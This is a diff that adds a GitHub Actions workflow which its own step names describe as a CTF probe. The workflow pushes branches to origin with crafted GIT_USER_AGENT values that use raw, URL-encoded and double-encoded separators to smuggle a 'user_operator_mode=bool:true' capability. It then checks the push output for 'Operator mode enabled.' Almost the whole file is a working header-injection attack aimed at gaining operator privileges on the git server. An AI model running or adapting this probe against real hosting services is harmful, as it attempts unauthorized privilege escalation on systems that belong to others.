@@ -1,0 +1,60 @@
+name: X-Stat encoded-equals oracle
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+    paths:
+      - .github/workflows/xstat-encoded-equals-oracle.yml
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Check out the owned CTF repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Test one-equals capability encodings
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          run_push() {
+            local label="$1"
+            local agent_value="$2"
+            local probe_ref="refs/heads/oracle/encoded-eq-${label}-${GITHUB_RUN_ID}"
+
+            set +e
+            GIT_USER_AGENT="$agent_value" \
+            GIT_TRACE_PACKET=1 \
+              git push origin "HEAD:${probe_ref}" 2>&1 | tee "${label}-output.txt"
+            local rc=${PIPESTATUS[0]}
+            set -e
+
+            echo "ORACLE_${label^^}_RC=${rc}"
+            if grep -Fq 'no voting servers succeeded' "${label}-output.txt"; then
+              echo "ORACLE_${label^^}_VOTING_REJECTION=1"
+            else
+              echo "ORACLE_${label^^}_VOTING_REJECTION=0"
+            fi
+            if grep -Fq 'Operator mode enabled.' "${label}-output.txt"; then
+              echo "ORACLE_${label^^}_OPERATOR_OUTPUT=1"
+              exit 42
+            else
+              echo "ORACLE_${label^^}_OPERATOR_OUTPUT=0"
+            fi
+          }
+
+          run_push control 'git/2.55'
+          run_push raw_semicolon_no_equal 'git/2.55;ctf_probe'
+          run_push raw_semicolon_encoded_equal_false 'git/2.55;user_operator_mode%3Dbool:false'
+          run_push raw_semicolon_encoded_equal_true 'git/2.55;user_operator_mode%3Dbool:true'
+          run_push encoded_both_true 'git/2.55%3Buser_operator_mode%3Dbool:true'
+          run_push double_encoded_both_true 'git/2.55%253Buser_operator_mode%253Dbool:true'
